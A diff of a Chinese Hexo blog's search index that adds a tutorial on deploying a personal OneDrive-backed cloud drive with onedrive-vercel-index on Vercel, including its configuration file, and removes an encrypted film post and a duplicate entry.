+<p>因此，与我个人而言，搭建这个基本上是不需要成本的，只是需要花费那么一丢丢的时间。但是对于刚上手的同学们来说，需要那么一点点的开销，但<s>相对于某度会员或者是他们卖的那种“24小时高速下载券”来说</s>并不多。</p>
+<h1>搭建网盘</h1>
+<h2 id="准备工作">准备工作</h2>
+<ul>
+<li>一台能上网的电脑</li>
+<li>一个GitHub账号</li>
+<li>一个Vercel账号</li>
+<li>一个Onedrive账号</li>
+</ul>
+<p>打开 onedrive-vercel-index 的<a href="https://github.com/spencerwooo/onedrive-vercel-index/">项目地址</a>并 <a href="https://github.com/spencerwooo/onedrive-vercel-index/fork">Fork</a> 到自己的账号中。</p>
+<p>打开项目中的/config/site.config.js，这个就是你的网盘的配置文件了，按照提示进行修改。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This file contains the configuration used for customising the website, such as the folder to share,</span><br><span class="line"> * the title, used Google fonts, site icons, contact info, etc.</span><br><span class="line"> */</span><br><span class="line">module.exports = {</span><br><span class="line">  // This is what we use to identify who you are when you are initialising the website for the first time.</span><br><span class="line">  // Make sure this is exactly the same as the email address you use to sign into your Microsoft account.</span><br><span class="line">  // You can also put this in your Vercel's environment variable 'NEXT_PUBLIC_USER_PRINCIPLE_NAME' if you worry about</span><br><span class="line">  // your email being exposed in public.</span><br><span class="line">  userPrincipalName: process.env.NEXT_PUBLIC_USER_PRINCIPLE_NAME || '此处填写你的Onedrive账号',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is the website icon to the left of the title inside the navigation bar. It should be placed under the</span><br><span class="line">  // /public directory of your GitHub project (not your OneDrive folder!), and referenced here by its relative path to /public.</span><br><span class="line">  icon: '/icons/aninegtubiao.png(你的网站图标路径)',</span><br><span class="line"></span><br><span class="line">  // Prefix for KV Storage</span><br><span class="line">  kvPrefix: process.env.KV_PREFIX || '',</span><br><span class="line"></span><br><span class="line">  // The name of your website. Present alongside your icon.</span><br><span class="line">  title: "此处填写你的网站名字",</span><br><span class="line"></span><br><span class="line">  // The folder that you are to share publicly with onedrive-vercel-index. Use '/' if you want to share your root folder.</span><br><span class="line">  baseDirectory: '/Public(你要在网页上展示的文件夹)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This represents the maximum number of items that one directory lists, pagination supported.</span><br><span class="line">  // Do note that this is limited up to 200 items by the upstream OneDrive API.</span><br><span class="line">  maxItems: 100,</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] We use Google Fonts natively for font customisations.</span><br><span class="line">  // You can check and generate the required links and names at https://fonts.google.com.</span><br><span class="line">  // googleFontSans - the sans serif font used in onedrive-vercel-index.</span><br><span class="line">  googleFontSans: 'Inter',</span><br><span class="line">  // googleFontMono - the monospace font used in onedrive-vercel-index.</span><br><span class="line">  googleFontMono: 'Fira Mono',</span><br><span class="line">  // googleFontLinks -  an array of links for referencing the google font assets.</span><br><span class="line">  googleFontLinks: ['https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Inter:wght@400;500;700&amp;display=swap'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] The footer component of your website. You can write HTML here, but you need to escape double</span><br><span class="line">  // quotes - changing " to \". You can write anything here, and if you like badges, generate some with https://shields.io</span><br><span class="line">  footer:</span><br><span class="line">    'Copyright © 2022 &lt;a href="https://anineg.space/" target="_blank"&gt;ANINEG&lt;/a&gt;  &amp;nbsp&amp;nbsp|&amp;nbsp&amp;nbsp  网盘资源仅供学习交流，严禁用于商业用途，请于24小时内删除(这里是页脚的内容)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is where you specify the folders that are password protected. It is an array of paths pointing to all</span><br><span class="line">  // the directories in which you have .password set. Check the documentation for details.</span><br><span class="line">  protectedRoutes: ['/个人', '/(这里几个地方填你要加密的文件夹的路径，将密码存成.password文件放在文件夹下)'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] Use "" here if you want to remove this email address from the nav bar.</span><br><span class="line">  email: 'mailto:email@anineg.space(别人联系你的邮箱地址，不要删掉就行)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is an array of names and links for setting your social information and links.</span><br><span class="line">  // In the latest update, all brand icons inside font awesome is supported and the icon to render is based on the name</span><br><span class="line">  // you provide. See the documentation for details.</span><br><span class="line">  links: [</span><br><span class="line">    {</span><br><span class="line">      name: '主页',</span><br><span class="line">      link: 'https://anineg.space/',</span><br><span class="line">    },</span><br><span class="line">  ],//这里填导航栏上你想要显示的链接</span><br><span class="line"></span><br><span class="line">  // This is a day.js-style datetime format string to format datetimes in the app. Ref to</span><br><span class="line">  // https://day.js.org/docs/en/display/format for detailed specification. The default value is ISO 8601 full datetime</span><br><span class="line">  // without timezone and replacing T with space.</span><br><span class="line">  datetimeFormat: 'YYYY-MM-DD HH:mm:ss',</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>然后打开 <a href="https://vercel.com/">Vercel 官网</a>注册登录，然后点 <code>New Project</code>，然后 Import 你刚刚 Fork 的仓库。然后点击 Deploy，仓库就会自动开始部署，一两分钟以后就好了。接下来，打开 Marketplace 中的 <a href="https://vercel.com/integrations/upstash">Upstash</a>，点击 <code>Add Integration</code>，然后选中你的账户，再选中你部署的仓库。如果这时出现了一些选项，最好都填上勾上。等待 Upstash 创建 Redis 数据库。完成创建后，在项目的 <code>Deployments</code> 中将项目 <code>Redeploy</code>。重新部署完成后，在<code>Settings</code>-<code>Domains</code>中填写你的域名并将其解析至Vercel后，即可访问部署好的网站。</p>
+<p>打开网站，根据网站的引导进行操作即可。到这里，你就拥有了一个自己的网盘了！</p>
+<p>当然，拿它来当图床，我想也是很不错的。</p>
+<h1>ANINEGの网盘</h1>
+<p>最后，放上我的网盘来给大家参考一下：</p>
+<p><img src="https://img.anineg.space/image-20221120120327292.png" alt="image-20221120120327292"></p>
+<p>网盘链接：</p>
+<div class="tag link"><a class="link-card" title="ANINEGの网盘" href="https://pan.anineg.space/zh-CN/"><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">ANINEGの网盘</p><p class="url">https://pan.anineg.space/zh-CN/</p></div></a></div>
+]]></content>
+      <categories>
+        <category>随手记</category>
+      </categories>
+      <tags>
+        <tag>Vercel</tag>
+        <tag>网盘</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ZoomEye-网络空间搜索引擎</title>
     <url>/2022/10/09/zoomeye/</url>
     <content><![CDATA[<p class="p center logo large">ZoomEye (钟馗之眼)</p>
@@ -1692,25 +1747,6 @@ PNG图片文件结构：</p>
       <tags>
         <tag>渗透</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>《我不是药神》</title>
-    <url>/2022/03/17/wobushiyaoshen/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="666d2179323feb5ec551598dfa620f9d33b63bb1b19f3500446823dea8a9a014">79a8510ad980b24d8ff0ffe9bafb69aa31e2611f27017824642b1b97f26821030d5768d3bab397a2eef0bc9bef1e7ef61ce60a3f5f9301034e0f53e08f8216354d3f8bace8b457c054647f31aaf51152513038b6a2cff455092a768e640b714c33c96045a0b45cc48e682558aa568125d35d6434a3a51e9aed2088e1dde1c9f8f1783456b024c4b18f969688488b8e28bcd797fdd03af9079fd90a6aafb5667f8bccf824571670406f21c45ccb5cc1e47fdbd44b5d7948120df03b74e2d9c9453e3741d3ee454890670de4fdf917e8d72f32f924e799aebb3825fd0c8cc2c150740b19eb4ec53bc65fe929776e7f02622eb1c82d67baa3ed71d5bd4f4c3e067a8aedec73189c14bd616a510346983b14d83142b5759903890555356bdf4e71dd9f143a331c91587c1ef7abebca3fdcc7fb240f7ab6834375362c16e3e10163062d498f81e12b0faa815242b25ecb4df22429266042453aadae9c2a857a55ddf8a62731f6e2932bd22698916064fd08d06a841534b0866d7728247977b22bf205b5b94ad809f7249228f17d880f727967c8a0bd7062727e68f77227ffdafa2558714cb22db74c3850bd99f97c3119a065a03e56b43d56ddc82ba8d02949bd16c71599b673a3cf0e3a7e0c39c7be0184b9f895f5a4daab98ecacc17b6345c7ed805d8137abcb04c29026e95853ef609bef9b1a5169c35b027ce46de901efc555b834c439e78dd9276412cc5b02eadef701fd5db3a62c714bb502eed6645121a64a7d45b3d4164874b5d44defc352c5dc935400fb1966ce54395a4fc24138a2614514d4a94c5443ea358934abc666c829721d9ea38e891a1da25542d5deaeafe55866416a6763fa28ff600fba9a115cc8373ea8daec78cd431dbe847496276e4f4af064e96ab590fc7ba69f044e2573077d9b680ceca7a8004a5e47230f6d04cd7c07280cefbd1b4a48e7ea911909bcc59789c33cf5f9d7abf3a3bc154e354146bc80a419dfcbfccee7ed342f3b2856b465575cf8c266b85d40ef9fed7a2505abc6659643313b363824c2310e8fed8f633b5ba21342576d2be25dddf61ac2c66d52a81eb83f913a17e007d91f38f2d3c9e46c95aa795ee4bbb0f9e8c83db338c05d5c332be29fe250d6c807ab1f4be56df0bb046b92ffb469230ff66696f803085fd9c355a5243984577577220a27e84f41a5e4a81000e65e289513f914cdff9d5e2cb8ee57e71c62cffc36df1b8c0f01e1433ebf9431bea3727ad9cabc537b4ea5cbfd6faee2161f6e6f79cbc06da83fb80971d09703e617af93b01bc8333ef109eff4d198c34a22a45184c988b60ccbcb5a47e9144d1d1c2cf862f7602754eafb1218cfa6980e3de4905dbb03c5e63b7249aaebe28aefde6e51a37897eda29f1c0bef37da797ed2afa710e5d2714cc8258604908588c95b6bf8e3cc1585180fb57e58bd1808d9a5f05abc5f28af1af791018c407d8db26c32f07e60d45532d09343da936078f4e04d2515fbc63b5f1d53bff4cd6f27e81435d0a821b69e7b8914816af1c397edecaf9e3930e56e1f1e632ce517572c73ce64b70f26b63f921e0b6d69788acb054339a743df82e76fafb585f4f7966bb33a2501df5b02831c00d6f49381de41f6bc78632a055b37bb86e2f9bda1319cfc76f8cf95978a2af6cc33176588562f4d2139b16d0ed18226af8f692435ded43069cebd2b0e6654350c06f79bd4ad5520da3ce1a150e7fa0bd950cc63ada79b5a2f4f5db9c270680adf27499e1ad8cee50613b1a06e8d1b86472e11c3ad526ccc6a485722b27e1f1fa022c18e91a4b6ce0ac76da77b496dd9b016dc58a8a29f0045b524ba79b1d010c682ef061121492638b323332a2170e839c241e3206fa33d3210dc55b34ae4926dd22f70419cb4720b6545874b7846c23b60ac5279f83d7cc57dd7a7ed10e8ccb24eb7b8587efd2e3d13ab7456a0813388ecfe80a1936f5b91e3c277e60c7934fc3fe61676cfaaeb25260df3aa2c28f7fd782772212720434ff5e6ece2e6161db0a24785fe469220578561b32863b0e0c9506facf9b4c0205083a9aa382df58acdfafa71de0a84a2d58f8efa637d54e874f23963d088b4b5f59d6a07546fe030a2bc7da9e1da4d6d4fcd4d2cc315cbfe408a78dc82d0b78ae3ca25188b447aa0e8a62d3903b7feaf1421f7191d3a98f6849f8608fe24bacf734c01e949707e99caee6748f537f1d13f57535f75d5cb7a2fe8b5abf7ad210842ecee55ea7d45ed8f8ca7633d8136f93194c9247993e636766cb8e0f003a7f7fc922820acb16d7fbc7e55b776ccd30dfe05fbe1d54a6bf6e283f8556eff4945327b2a8f0afb8d99f4f35327a6fbbfd630db9e9ed20ced7cb0bf2593622e4906b7f6af5a8646037c1beaece1818a561dc16141f784bc14186ff66fce5aba30ccdcef5982cb6ae18d8f00b54aa0b4dee315c95dffae347bd296bb5b5c23b7356b24880aee37bbc9bec86eefaa8734638fb146475d222a13bb3b14b9dfd05da8026bc0e462758685fdacec1e17768cefc168b759abf909aab856e8df0f8368671dcb96401e9c30c8a8456c554a8bce3cf301769b6e5c92923da34b0d8a04f14d2eb0f5bc4372afd50586a25b9f50c1cfabf43dc83a216cb7c47cf9445abb3b30bfa2c25a586381726449e29e206c2468b6ca68cf05d88b1b881e005385cbcd8c9f6d4e8bc0ac0378b898b22004d2576ee1b50f62e2c1f35491db5cf51b8a33db23eb44d4890491222e79a92395e9494a2018a9a9dec978d8ba7fd4be5b06a2bda49ab5c63cade4bd520a22f1482b06e0b1cd213f28a24a29f102ee527a65cba5e58c550fa94701f7d2f7a370bc28ea38318fa1c40c630139e455d7d8d4293945f6703c304468ec9db040c062012c88abef9ea414e6cbc03f528587e38fd599f728878dead5ba09eb046b1043c32ab65e110007e81310c7c70023e018a02551c82776218280f053183222681cbfa52b649fdf16bccb1b0ad52a2b2466c13e5d74c757b6279456e095d15700c454ca1d80d4e53610caee23bc6a0c2e1ea0500d9b657c52da52242cbeec41c54b6326dc0a27ff9fd90890e0052af497016d6dc7db63a7faf124eb412b3e2ec8dadc22ebcecd37fd5c28eb1dbc3e6e38ba3d1c6b00d7c5f12c92934f7caba5fdf68222eaf589506112a82c7a0702b71ef42209f15d358a72cc96e0b01c5f7e3d2b5c4a642ba0cdde80d5514245873df84467a6c36ee889b821d1981dbe802823e2e6ba059de91f3f1df3546aa5aa3756e678ec41670cac78bccb7cf09206a0d937c1d2e4ccc03bf63e9141dde155606eb7241527138dbb477d0ca3f9ec7a9d17cd09def2185a4d8ef1323031c70ab269387f106bf9cf653eceaa5f3d5296db70d0901e7aa2a3d68fc612eb365c75656c00941b55d3a4d45455fac6059002f898a21c7f4b460532dda2bf8eb03e8c16f720e29f1074116a78301f9bbd2a43d274e39f6898ba10758bcbffcee3f661ca3e3c227a6c9b99ddec81437cbdb4187b79ba47495358d45e32ac793ef0953e4dd7e7174eaea19d0eb4fdc4b3c6c9ffe9ce3c1661f91e4ede119a9715f00f9f12e568fab689ab8feb561cbdf0181da05dd11fd5cea4819e6d5b6738ec24cb1d717769e6608aea0a7bc523aef9928ce6a02c03ce766f322b79d477e028e7e8b2a77f7c701f4d839ac7a8d95408461a74cdb4047288ef33148a4355c2629821241bd91c95aa8baa7ced9e6a57a3899fd0d359a2b260b0d83777b8718d0035184c61ebafaa11143675da1cd67890351d5862011c35429c4bf7927548b2f36b1efccad7ad399aac8332164b2ad901a6e9663890449eecab58d147acb6a06d676da278b3a523a951b6b85b2b3f24306dd3b6def987c78e67ecda4f33212fec193d611267749cdde871fc84d059344ecde839338706eafcbf31f640f889c283153c55c1ad7c40055a9f4943edc4a98046d5e6655d329d2969f2d5b7edeb4bacf67c64e4706dbacb3da84d18e25f0552dc268ba34bd23e96f22a1371b58f49fac0bb5770832a82ebb95c9cc762a26714ef45a1805897ea72d44b24573ac89d8cc7e602610d1edc44b0cc1e5d811bca3fba5c6b74d34107fa51fe4c5bba03fda1d7c588425fac6f927c4185b98d76b203a793de4d9168ec2e63d218f968b0e65926ac89c35204eca2801fae023794fa407550ef38d46e81ecfae990ad3adb30d658879445f88b494a4f53ac269c9775ac16340f30e4c15efc46de0fa21c217b8b8168bbb0a1b0aa7f50f0f33a516cfac03f1cb790be05002a11db7f47412ca20cee8df52d9821251441ddaef62db46d217eb37f48d4e5db7c2e1f797003a60419cb4c555e80974a4419c95c368f64d8ae8f5156337900bbd258ada5fffec1914d6aa6aa05cf9ef3248177e24f1568c14d032a5023141e84ef716c6488791b3a90def98f561fde7b9a7908f3bcc3e53bf6b436d48c73d834f48149e2b9ac4cdd24da95354f41a6eed783034e739aef8b8286c49970620d636e6d90c72ac28357a4a780002ac5e96e4abce44577b9533e40095c93cf3cdd566717124ba5a8c84ac5c08f18b8916034dcfed0db6269a74df9282dadec46d0bbe2dde8708ff20db447f04befa705d2e48eb1462d0d82b3dd68f958c15d40a17b1b9cac98d2b3767638551dec3531729edf90b22973fbb15d133d162a2760de9ae1a401563295a85b87c7f24f5ce7ccc94dcfea1b512007ff90fb7e7d6a5ffe12dbd94aa4c8b40237471f53203b5c6112f23bd41de769e514285c29156248538866eacaaa30bb86469e0e3fd56da5d86e097f6704ee54297ce6046e80ccf0323cf450cdaade7e472f6a2ee24af6f974d9b11cb088f35a50f3bab88d4ab64b8f994a9f3d70ca56d49b0024a7c6be799c1a9dfc8e71627530f52ff4d09d5707a75fa3cb1eb4d2cd4ff2a4856c4e06ba798b3f84008e03867d486f314c234bfec92463cc842b822fada1f485d56efa01d514e8806272d455c36fcd87414628473dbaf582ee9d4cd376ef759f30c885679efa1bf54c299db82f7bd860bc2e83e7227f3363a6eabe4449d31249c5fef01e0bc10e703ef20298140b5dd39a2a30d954d5a20ebaa9114af580d8cfc6fba1909db719b5bfe13f83ad0c6d20d7ef94ed755dab8e4550ff7d3237ffb707af42f11256f59890ab5ad2bf6cfa57e4979fb3db0564b13f12fc26785d96e0b138afd14d0b58123287270e6787768adbdd9938adfcb00e4d6f8b49d26d377b449fea51de5d425de1f774901522f235f3e028cc7a73a7d4d09c36524fe47945503073c5bc0477b86a46160a902b0696f4582817e01e0e70e4f622e92d90ca4a4123f9cf48dcfb91d6d2fd7afa940d35f5326d618d1ddb99620dc0bb9823e029028de0ff7d5704ce2a7085419ebb02d3793499d092b207242a1ca674ac2f3974e1d579c7c7261c6972007df6839eba1aabb12055107877912d62a7f7627002b700e154569853862aa6bd43d4f5478be4718fb8612ce90b48692ee1c29ef569ab6b08f4d81905fb8a82415a348b904087cefcab8a880141c33a4320f4653789ac38c55c05628f56eabc5f04db8e64a70488707ddbf5f6c8e0ac9f7ed9ee0b818b6e762b1b1c9b302fb651cf1ef7a64d6bf73937efbe4736372a74175f9845f5922b9e4d04c2186a5ea03dff9cb85907b8c2cc19f55a1253d18536dc779578c84fbd568d55ba9658c2ae6d5f6c590aea67f2c247f3c6a470f4395454bd69bfd8ef83a537b08286ac631e15585cdfbc4eb19809edc5651f16b09dab9556c00ad99e3a26393bb542db8786ceddca2687ae321ed721854c1ebb23567f5824b25fcab6cc4e4e48cbb23e61d4e9e29be4cc6a93dd665103553e4dd304005045635c044e8803617a88a19f14be8f7d420fbe0feea1b7f43ecd721d7b9e7779f4fc434bed7b03cd9119bfe79e06a1698d0644a5e5ae44cf3e1023f352cef7d4e5f5330429c8241d32ee22130c9ee1e3715a3e5d58f3950c9f379cef0d0d69c9837688914334ef892346a0f58b132f628c4df86507af6bec6547e810bfdcb98c98e4f211f0ceb3a6f094b33d4d644b6623b39dc06d82a2effe78d2957a43f4cdec02c145f7c3b97ec870c6dc228e86b45db46e26c2590e59d64d14d27a85be8221a87da0b4f0273952a214db0333112fd7b5242954e89f1cfbb1aff46786e87e1bd7e3d185283bd103da9e473d559784fbafc3034ec46b872e5980fe4bc19344628d89859479a000a23775cb041aade2da0f25370c70bc449629a608f2a251d1d0751c7b3be73854ff</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-up">
-      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>随手记</category>
-      </categories>
   </entry>
   <entry>
     <title>CTF隐写术(其他文件隐写)</title>
@@ -3772,42 +3808,6 @@ PNG图片文件结构：</p>
       </categories>
       <tags>
         <tag>隐写</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建几乎0成本的个人网盘</title>
-    <url>/2022/11/20/yunpan/</url>
-    <content><![CDATA[<h1>Onedrive-Vercel-Index</h1>
-<p>最近在网上发现了一个挺有意思的项目<a href="https://github.com/spencerwooo/onedrive-vercel-index/">onedrive-vercel-index</a>，它可以在Vercel上部署一个属于你自己的网盘。那么相比于百度网盘，你对他有着很高的控制权，<s>并不需要担心你的资源会被河蟹</s>。那么至于网速，Onedrive给的带宽不太稳定，有时可以跑到满速，有时只有3MB/s，但怎么说也比某度网盘良心多了。</p>
-<p>但这个网盘最大的缺点就在于空间上。现在注册Onedrive默认是5GB的空间，这显然不够用。但是也并非没有办法，我们在某宝上花个大概三块钱就可以把一个账号的空间永久提升至15GB。当然，如果你是购买了office365的话，那你就可以拿到1T的容量，就不需要担心什么容量的问题。网上还有一种教育版的，容量为1-5T，但是我不建议大家使用，因为这个账号的管理员可以看到你的文件，大家应该都知道数据的重要性，所以不要贪便宜使用这种。</p>
-<p>最后一个问题，Vercel给你提供默认的域名大概率由于某些原因无法访问，所以你还需要拥有一个自己的域名，并把它解析到Vercel上。购买一个域名其实并不贵，如果是新用户就会更便宜了。例如<code>.space</code> <code>.top</code> <code>.asia</code>这类，新用户只需要个位数就能拿下一年，甚至在搞活动的时候一块钱就能拿下一个<code>.cn</code>域名。一个域名可以解析到很多服务器，对于已经有域名的同学来说，这个成本直接忽略不计。</p>
-<p>因此，与我个人而言，搭建这个基本上是不需要成本的，只是需要花费那么一丢丢的时间。但是对于刚上手的同学们来说，需要那么一点点的开销，但<s>相对于某度会员或者是他们卖的那种“24小时高速下载券”来说</s>并不多。</p>
-<h1>搭建网盘</h1>
-<h2 id="准备工作">准备工作</h2>
-<ul>
-<li>一台能上网的电脑</li>
-<li>一个GitHub账号</li>
-<li>一个Vercel账号</li>
-<li>一个Onedrive账号</li>
-</ul>
-<p>打开 onedrive-vercel-index 的<a href="https://github.com/spencerwooo/onedrive-vercel-index/">项目地址</a>并 <a href="https://github.com/spencerwooo/onedrive-vercel-index/fork">Fork</a> 到自己的账号中。</p>
-<p>打开项目中的/config/site.config.js，这个就是你的网盘的配置文件了，按照提示进行修改。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This file contains the configuration used for customising the website, such as the folder to share,</span><br><span class="line"> * the title, used Google fonts, site icons, contact info, etc.</span><br><span class="line"> */</span><br><span class="line">module.exports = {</span><br><span class="line">  // This is what we use to identify who you are when you are initialising the website for the first time.</span><br><span class="line">  // Make sure this is exactly the same as the email address you use to sign into your Microsoft account.</span><br><span class="line">  // You can also put this in your Vercel's environment variable 'NEXT_PUBLIC_USER_PRINCIPLE_NAME' if you worry about</span><br><span class="line">  // your email being exposed in public.</span><br><span class="line">  userPrincipalName: process.env.NEXT_PUBLIC_USER_PRINCIPLE_NAME || '此处填写你的Onedrive账号',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is the website icon to the left of the title inside the navigation bar. It should be placed under the</span><br><span class="line">  // /public directory of your GitHub project (not your OneDrive folder!), and referenced here by its relative path to /public.</span><br><span class="line">  icon: '/icons/aninegtubiao.png(你的网站图标路径)',</span><br><span class="line"></span><br><span class="line">  // Prefix for KV Storage</span><br><span class="line">  kvPrefix: process.env.KV_PREFIX || '',</span><br><span class="line"></span><br><span class="line">  // The name of your website. Present alongside your icon.</span><br><span class="line">  title: "此处填写你的网站名字",</span><br><span class="line"></span><br><span class="line">  // The folder that you are to share publicly with onedrive-vercel-index. Use '/' if you want to share your root folder.</span><br><span class="line">  baseDirectory: '/Public(你要在网页上展示的文件夹)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This represents the maximum number of items that one directory lists, pagination supported.</span><br><span class="line">  // Do note that this is limited up to 200 items by the upstream OneDrive API.</span><br><span class="line">  maxItems: 100,</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] We use Google Fonts natively for font customisations.</span><br><span class="line">  // You can check and generate the required links and names at https://fonts.google.com.</span><br><span class="line">  // googleFontSans - the sans serif font used in onedrive-vercel-index.</span><br><span class="line">  googleFontSans: 'Inter',</span><br><span class="line">  // googleFontMono - the monospace font used in onedrive-vercel-index.</span><br><span class="line">  googleFontMono: 'Fira Mono',</span><br><span class="line">  // googleFontLinks -  an array of links for referencing the google font assets.</span><br><span class="line">  googleFontLinks: ['https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Inter:wght@400;500;700&amp;display=swap'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] The footer component of your website. You can write HTML here, but you need to escape double</span><br><span class="line">  // quotes - changing " to \". You can write anything here, and if you like badges, generate some with https://shields.io</span><br><span class="line">  footer:</span><br><span class="line">    'Copyright © 2022 &lt;a href="https://anineg.space/" target="_blank"&gt;ANINEG&lt;/a&gt;  &amp;nbsp&amp;nbsp|&amp;nbsp&amp;nbsp  网盘资源仅供学习交流，严禁用于商业用途，请于24小时内删除(这里是页脚的内容)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is where you specify the folders that are password protected. It is an array of paths pointing to all</span><br><span class="line">  // the directories in which you have .password set. Check the documentation for details.</span><br><span class="line">  protectedRoutes: ['/个人', '/(这里几个地方填你要加密的文件夹的路径，将密码存成.password文件放在文件夹下)'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] Use "" here if you want to remove this email address from the nav bar.</span><br><span class="line">  email: 'mailto:email@anineg.space(别人联系你的邮箱地址，不要删掉就行)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is an array of names and links for setting your social information and links.</span><br><span class="line">  // In the latest update, all brand icons inside font awesome is supported and the icon to render is based on the name</span><br><span class="line">  // you provide. See the documentation for details.</span><br><span class="line">  links: [</span><br><span class="line">    {</span><br><span class="line">      name: '主页',</span><br><span class="line">      link: 'https://anineg.space/',</span><br><span class="line">    },</span><br><span class="line">  ],//这里填导航栏上你想要显示的链接</span><br><span class="line"></span><br><span class="line">  // This is a day.js-style datetime format string to format datetimes in the app. Ref to</span><br><span class="line">  // https://day.js.org/docs/en/display/format for detailed specification. The default value is ISO 8601 full datetime</span><br><span class="line">  // without timezone and replacing T with space.</span><br><span class="line">  datetimeFormat: 'YYYY-MM-DD HH:mm:ss',</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>然后打开 <a href="https://vercel.com/">Vercel 官网</a>注册登录，然后点 <code>New Project</code>，然后 Import 你刚刚 Fork 的仓库。然后点击 Deploy，仓库就会自动开始部署，一两分钟以后就好了。接下来，打开 Marketplace 中的 <a href="https://vercel.com/integrations/upstash">Upstash</a>，点击 <code>Add Integration</code>，然后选中你的账户，再选中你部署的仓库。如果这时出现了一些选项，最好都填上勾上。等待 Upstash 创建 Redis 数据库。完成创建后，在项目的 <code>Deployments</code> 中将项目 <code>Redeploy</code>。重新部署完成后，在<code>Settings</code>-<code>Domains</code>中填写你的域名并将其解析至Vercel后，即可访问部署好的网站。</p>
-<p>打开网站，根据网站的引导进行操作即可。到这里，你就拥有了一个自己的网盘了！</p>
-<p>当然，拿它来当图床，我想也是很不错的。</p>
-<h1>ANINEGの网盘</h1>
-<p>最后，放上我的网盘来给大家参考一下：</p>
-<p><img src="https://img.anineg.space/image-20221120120327292.png" alt="image-20221120120327292"></p>
-<p>网盘链接：</p>
-<div class="tag link"><a class="link-card" title="ANINEGの网盘" href="https://pan.anineg.space/zh-CN/"><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">ANINEGの网盘</p><p class="url">https://pan.anineg.space/zh-CN/</p></div></a></div>
-]]></content>
-      <categories>
-        <category>随手记</category>
-      </categories>
-      <tags>
-        <tag>Vercel</tag>
-        <tag>网盘</tag>
       </tags>
   </entry>
 </search>
